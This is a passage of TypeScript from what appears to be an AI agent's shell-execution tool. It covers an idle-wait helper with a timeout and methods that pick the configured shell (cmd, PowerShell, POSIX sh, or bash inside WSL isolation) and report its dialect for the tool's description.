  /** Resolve on the next output, the job ending, or `ms` passing — whichever comes first. */
  private idle(proc: Proc, ms: number): Promise<void> {
    return new Promise((resolve) => {
      /*
       * Deliberately NOT unref'd. While a waiter is blocked, this timer is the only thing that will
       * wake it if the job produces no further output and never ends — an unref'd timer lets Node
       * see an empty event loop and exit with the promise still pending ("unsettled top-level
       * await"), which is how this was found: a short-lived wait script exited the process instead
       * of printing the job's last output.
       */
      const timer = setTimeout(() => { proc.waiters.delete(waker); resolve(); }, ms);
      const waker = () => { clearTimeout(timer); proc.waiters.delete(waker); resolve(); };
      proc.waiters.add(waker);
    });
  }

  private resolveShell(): string {
    const pref = this.config.shell;
    if (pref === 'auto') {
      return IS_WINDOWS ? 'cmd.exe' : '/bin/sh';
    }
    if (pref === 'cmd') return 'cmd.exe';
    if (pref === 'powershell') return 'powershell.exe';
    return pref;
  }

  /**
   * The shell a command will actually be parsed by — public because the `shell` tool's own
   * DESCRIPTION has to name it (评测 3b: 描述未标 shell 类型).
   *
   * A model cannot write for a shell it was not told about, and the cost of not saying is the whole
   * class of failure `detectShellDialectMismatch` exists to report after the fact. Telling it before
   * the call is the cheaper half of the same fix.
   *
   * Reports the isolation shell when isolation is on, because that is what runs: `bash -lc` inside
   * the namespace (see `buildConfinedScript`), where POSIX is the correct dialect rather than a gap.
   */
  shellName(): string {
    return this.config.isolation !== 'off' ? 'bash -lc（WSL 隔离内）' : this.resolveShell();
  }

  /** The language {shellName} speaks. `cmd` is the one with the gap table above. */
  dialect(): ShellDialect {
    if (this.config.isolation !== 'off') return 'posix';
    // Strip the extension instead of naming it: `resolveShell()` may return a bare `cmd`, a
    // `cmd.exe`, or a full path to it, and all three speak the same dialect.
    const shell = this.resolveShell().toLowerCase().replace(/\.exe$/, '');
    if (shell === 'cmd') return 'cmd';
    if (shell.includes('powershell') || shell === 'pwsh') return 'powershell';
    return 'posix';
  }
}
